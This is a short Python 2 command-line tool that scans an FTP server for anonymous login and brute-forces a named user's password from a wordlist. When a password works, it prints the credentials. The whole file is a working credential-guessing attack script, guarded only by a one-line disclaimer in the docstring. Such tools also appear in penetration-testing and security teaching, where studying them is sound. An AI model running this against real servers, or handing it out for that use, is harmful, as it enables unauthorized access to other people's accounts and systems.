#!./env/bin/python

""" FTP Scanner/Brute Forcer

    Use this to either scan a host for anonymous logins or to try a
    password list against a host.

    Don't be a moron, please don't use this for something illegal.

    Usage:
        ftp_anon_scanner.py --brute [<host> <user> <password_file>]
        ftp_anon_scanner.py --anon [<host>]
        ftp_anon_scanner.py (-h | --help)
        ftp_anon_scanner.py (-v | --version)

    Options:
        -h --help       Show this screen.
        --version       Show version
"""

import ftplib
from docopt import docopt
from utilities import escape_color


def brute_login(hostname, user_name, password_file):
    fp = open(password_file, 'r')

    for line in fp.readlines():
        password = line.strip('\r').strip('\n')

        print "[+] Trying: " + user_name + "/" + password

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user_name, password)
            print escape_color('[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + user_name + ":" + password, "green")
            ftp.quit()

            return (user_name, password)
        except Exception:
            pass

    print escape_color('[-] User name or password not in FTP credentials.', "red")
    return (None, None)


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        ftp.quit()

        return True
    except Exception:
        return False


def main(arguments):
    if arguments['--anon']:
        if not arguments['<host>']:
            host = raw_input("Hostname: ")
        else:
            host = arguments['<host>']

        anon = anon_login(host)

        if anon:
            print escape_color('[*] ' + str(host) + ' FTP Anonymous Logon Succeeded.', "green")
        else:
            print escape_color('[-] ' + str(host) + ' FTP Anonymous Logon Failed.', "red")
    elif arguments['--brute']:
        if not arguments['<host>']:
            host = raw_input("Hostname: ")
        else:
            host = arguments['<host>']

        if not arguments['<user>']:
            user = raw_input("User name: ")
        else:
            user = arguments['<user>']

        if not arguments['<password_file>']:
            password_file = raw_input("Password File Path: ")
        else:
            password_file = arguments['<password_file>']

        brute_login(host, user, password_file)


if __name__ == '__main__':
    arguments = docopt(__doc__, version="0.1")
    main(arguments)
